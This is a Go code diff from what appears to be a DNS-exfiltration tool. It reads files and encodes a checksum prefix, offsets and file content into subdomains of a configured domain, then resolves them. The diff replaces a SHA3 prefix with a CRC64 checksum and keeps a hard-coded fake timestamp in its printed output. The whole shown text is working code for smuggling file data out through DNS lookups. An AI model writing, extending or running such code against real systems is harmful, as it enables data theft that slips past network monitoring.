@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"encoding/hex"
 	"net"
-	"golang.org/x/crypto/sha3"
 	"sync"
 	"log"
 	"bytes"
@@ -13,11 +12,13 @@ import (
 	"strconv"
 	"InfoSec/Params"
 	"context"
+	"hash/crc64"
 )
 
 
 // WG is wait group to synchronize the pool and the main routine
 var Wg sync.WaitGroup
+var ecmaTable = crc64.MakeTable(crc64.ECMA)
 
 // Scan reads file paths from channel and sends it
 func Scan() {
@@ -37,7 +38,7 @@ func SendFile(path string) error {
 	}
 	defer file.Close()
 	info, _ := file.Stat()
-	prefix := sha3.Sum224([]byte(path))
+	prefix := crc64.Checksum([]byte(path), ecmaTable)
 
 	filename := info.Name()
 	size := strconv.FormatInt(info.Size(), 10)
@@ -65,12 +66,12 @@ func SendFile(path string) error {
 }
 
 // resolve: forms host and resolves it
-func resolve(content string, prefix [28]byte, offset int64) {
+func resolve(content string, prefix uint64, offset int64) {
 	Resolver := &net.Resolver{
 		PreferGo: Params.PreferGoResolver,
 		StrictErrors: true,
 	}
-	host := fmt.Sprintf("%x.%019x.%s.%s", prefix, offset, content, Params.URL)
+	host := fmt.Sprintf("%016x.%019x.%s.%s", prefix, offset, content, Params.URL)
 	fmt.Printf("2017-11-12 14:22:41 %s.\n", host)
 	_, err := Resolver.LookupHost(context.Background(), host)
 	if err != nil {
